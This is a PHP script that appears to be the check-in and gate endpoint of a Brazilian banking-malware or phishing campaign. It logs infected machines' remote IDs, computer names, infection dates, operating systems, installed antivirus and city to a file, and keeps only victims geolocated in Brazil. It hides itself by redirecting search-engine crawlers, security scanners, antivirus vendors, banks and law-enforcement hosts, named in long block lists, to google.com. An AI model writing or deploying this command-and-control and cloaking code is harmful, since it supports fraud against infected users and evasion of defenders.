<?php

if (empty($_GET)){
    http_response_code(401);
    exit();
}

setlocale(LC_TIME, 'pt_BR', 'pt_BR.utf-8', 'pt_BR.utf-8', 'portuguese');
date_default_timezone_set('America/Sao_Paulo');
require_once('funcoes.php');

$urlBloqueio = "http://google.com/";
$urlContador = "http://google.com/";

$ip = getIp();

if(!isset($_GET['MD'])){
    $ST = "BLOQUEADO";
}

if(!isset($_GET['AV'])){
    $ST = "BLOQUEADO";
}

if(!isset($_GET['SO'])){
    $ST = "BLOQUEADO";
}

if(!isset($_GET['US'])){
    $ST = "BLOQUEADO";
}

if(!isset($_GET['PC'])){
    $ST = "BLOQUEADO";
}


if (preg_match('/Googlebot\/|Googlebot-Mobile|Googlebot-Image|Googlebot-News|Googlebot-Video|AdsBot-Google([^-]|$)|AdsBot-Google-Mobile|Feedfetcher-Google|Mediapartners-Google|Mediapartners \(Googlebot\)|APIs-Google|bingbot|Slurp|[wW]get|LinkedInBot|Python-urllib|python-requests|libwww-perl|httpunit|nutch|Go-http-client|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|BIGLOTRON|Teoma|convera|seekbot|Gigabot|Gigablast|exabot|ia_archiver|GingerCrawler|webmon |HTTrack|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|findlink|msrbot|panscient|yacybot|AISearchBot|ips-agent|tagoobot|MJ12bot|woriobot|yanga|buzzbot|mlbot|YandexBot|YandexImages|YandexAccessibilityBot|YandexMobileBot|purebot|Linguee Bot|CyberPatrol|voilabot|Baiduspider|citeseerxbot|spbot|twengabot|postrank|TurnitinBot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|Ahrefs(Bot|SiteAudit)|fuelbot|CrunchBot|IndeedBot|mappydata|woobot|ZoominfoBot|PrivacyAwareBot|Multiviewbot|SWIMGBot|Grobbot|eright|Apercite|semanticbot|Aboundex|domaincrawler|wbsearchbot|summify|CCBot|edisterbot|seznambot|ec2linkfinder|gslfbot|aiHitBot|intelium_bot|facebookexternalhit|Yeti|RetrevoPageAnalyzer|lb-spider|Sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|OrangeBot\/|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|S[eE][mM]rushBot|yoozBot|lipperhey|Y!J|Domain Re-Animator Bot|AddThis|Screaming Frog SEO Spider|MetaURI|Scrapy|Livelap[bB]ot|OpenHoseBot|CapsuleChecker|collection@infegy.com|IstellaBot|DeuSu\/|betaBot|Cliqzbot\/|MojeekBot\/|netEstate NE Crawler|SafeSearch microdata crawler|Gluten Free Crawler\/|Sonic|Sysomos|Trove|deadlinkchecker|Slack-ImgProxy|Embedly|RankActiveLinkBot|iskanie|SafeDNSBot|SkypeUriPreview|Veoozbot|Slackbot|redditbot|datagnionbot|Google-Adwords-Instant|adbeat_bot|WhatsApp|contxbot|pinterest.com.bot|electricmonk|GarlikCrawler|BingPreview\/|vebidoobot|FemtosearchBot|Yahoo Link Preview|MetaJobBot|DomainStatsBot|mindUpBot|Daum\/|Jugendschutzprogramm-Crawler|Xenu Link Sleuth|Pcore-HTTP|moatbot|KosmioBot|pingdom|AppInsights|PhantomJS|Gowikibot|PiplBot|Discordbot|TelegramBot|Jetslide|newsharecounts|James BOT|Bark[rR]owler|TinEye|SocialRankIOBot|trendictionbot|Ocarinabot|epicbot|Primalbot|DuckDuckGo-Favicons-Bot|GnowitNewsbot|Leikibot|LinkArchiver|YaK\/|PaperLiBot|Digg Deeper|dcrawl|Snacktory|AndersPinkBot|Fyrebot|EveryoneSocialBot|Mediatoolkitbot|Luminator-robots|ExtLinksBot|SurveyBot|NING\/|okhttp|Nuzzel|omgili|PocketParser|YisouSpider|um-LN|ToutiaoSpider|MuckRack|Jamie\'s Spider|AHC\/|NetcraftSurveyAgent|Laserlikebot|^Apache-HttpClient|AppEngine-Google|Jetty|Upflow|Thinklab|Traackr.com|Twurly|Mastodon|http_get|DnyzBot|botify|007ac9 Crawler|BehloolBot|BrandVerity|check_http|BDCbot|ZumBot|EZID|ICC-Crawler|ArchiveBot|^LCC |filterdb.iss.net\/crawler|BLP_bbot|BomboraBot|Buck\/|Companybook-Crawler|Genieo|magpie-crawler|MeltwaterNews|Moreover|newspaper\/|ScoutJet|(^| )sentry\/|StorygizeBot|UptimeRobot|OutclicksBot|seoscanners|Hatena|Google Web Preview|MauiBot|AlphaBot|SBL-BOT|IAS crawler|adscanner|Netvibes|acapbot|Baidu-YunGuanCe|bitlybot|blogmuraBot|Bot.AraTurka.com|bot-pge.chlooe.com|BoxcarBot|BTWebClient|ContextAd Bot|Digincore bot|Disqus|Feedly|Fetch\/|Fever|Flamingo_SearchEngine|FlipboardProxy|g2reader-bot|G2 Web Services|imrbot|K7MLWCBot|Kemvibot|Landau-Media-Spider|linkapediabot|vkShare|Siteimprove.com|BLEXBot\/|DareBoost|ZuperlistBot\/|Miniflux\/|Feedspot|Diffbot\/|SEOkicks|tracemyfile|Nimbostratus-Bot|zgrab|PR-CY.RU|AdsTxtCrawler|Datafeedwatch|Zabbix|TangibleeBot|google-xrawler|axios|Amazon CloudFront|Pulsepoint|CloudFlare-AlwaysOnline|Google-Structured-Data-Testing-Tool|WordupInfoSearch|WebDataStats|HttpUrlConnection|Seekport Crawler|ZoomBot|VelenPublicWebCrawler|MoodleBot|jpg-newsbot|outbrain|W3C_Validator|Validator\.nu|W3C-checklink|W3C-mobileOK|W3C_I18n-Checker|FeedValidator|W3C_CSS_Validator|W3C_Unicorn|Google-PhysicalWeb|Blackboard|ICBot\/|BazQux|Twingly|Rivva|Experibot|awesomecrawler|Dataprovider.com|GroupHigh\/|theoldreader.com|AnyEvent|Uptimebot\.org|Nmap Scripting Engine|2ip.ru|Clickagy|Caliperbot|MBCrawler|online-webceo-bot|B2B Bot|AddSearchBot|Google Favicon|HubSpot|Chrome-Lighthouse|HeadlessChrome|CheckMarkNetwork\/|www\.uptime\.com|Streamline3Bot\/|serpstatbot\/|MixnodeCache\/|^curl|SimpleScraper|RSSingBot|Jooblebot|fedoraplanet|Friendica|NextCloud|Tiny Tiny RSS|RegionStuttgartBot|Bytespider|Datanyze|Google-Site-Verification/', $_SERVER['HTTP_USER_AGENT'])) {
	$ST = "BLOQUEADO";
}

$HOSTS_BLOCK = array(".tor.","123planosdesaude","VAULTVPN","activescan","alpha2","amazon","ancombraterney","anti-phishing","antipishing","antispam","antivirus","avast","bancopastor","bancopopular","banesto","bankofamerica","barracuda","bb.com.br","bitdefender","bradesco","cajamadrid","chicago ","cia.gov","clamav","clamwin","cleandir","colocrossing","coloup","consumer","copel","datapacket","delitosinformaticos","detector","dimenoc","dnblead","donategrid","dufrio","easysol","ebay.com","eset","eveocloud","f-secure","fasano","fbi.gov","fraudwatchinternational","free-av","gfihispana","google","greenmountainaccess","grisoft","hands","hauri-la","hispasec","instantcheckmain","itau","iwgroup","kapersky","laarnes","letti","linode","mailcontrol","mailstream","mallshill","marimex","mcafee","mgconecta","microsoft.com","midphase","monitor","msn.com","nephosdns","netcraft.com","nod32","norton","offerzz1","onlinedc","opendns","owned-networks","panda.com","pandasoftware","paypal","phish","pish","prcdn","protectedgroup","quadranet","rodobens.com.br","rsa.com","rsghosting","sajonaramail","santander","scaleway","scotiabank","security","seguridad","sescsp","sophos","spamfirewall2","spfbl","symantec","thinins","trendmicro","trustwave","unicaja","utfpr.edu.br","verisign","veritas","viabcp","vnunet","vodafone","vultr","wbinfo","webandseo ","zonealarm");

$HOST = gethostbyaddr($_SERVER['REMOTE_ADDR']);

foreach($HOSTS_BLOCK as $ROWS){
	if(strpos($HOST, $ROWS) == true){
		$ST = "BLOQUEADO";
        break;
	}
}

$idRemoto       = isset($_GET['IDR']) ? $_GET['IDR'] : "-";
$pc_nome        = isset($_GET['PC']) ? $_GET['PC'] : "-";
$dataInfectado  = isset($_GET['DTF']) ? $_GET['DTF'] : "-";
$SO             = isset($_GET['SO']) ? $_GET['SO'] : "-";
$anti_instalado = isset($_GET['AV']) ? $_GET['AV'] : "-";
$plugin         = isset($_GET['PG']) ? $_GET['PG'] : "-";
$cidade         = isset($_GET['CD']) ? $_GET['CD'] : "-";
$spammer        = isset($_GET['SPM']) ? $_GET['SPM'] : "-";

$data = date('d/m/Y H:i:s');
$str = $idRemoto."|".$pc_nome."|".$data."|".$SO."|".$anti_instalado."|".$plugin."|".$cidade."|".$spammer;

$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

if ($details->country === "BR") {
    $country = "Brasil";
}

if (!empty($details->city) || !empty($details->region) || !empty($country)) {
    if ($country == 'Brasil') {
        file_put_contents($arquivoContador, $str.PHP_EOL, FILE_APPEND);        
    }
}

if($ST == "BLOQUEADO")
{
    header('Location: '.$urlBloqueio);
    exit();
}

header('Location: '.$urlContador);


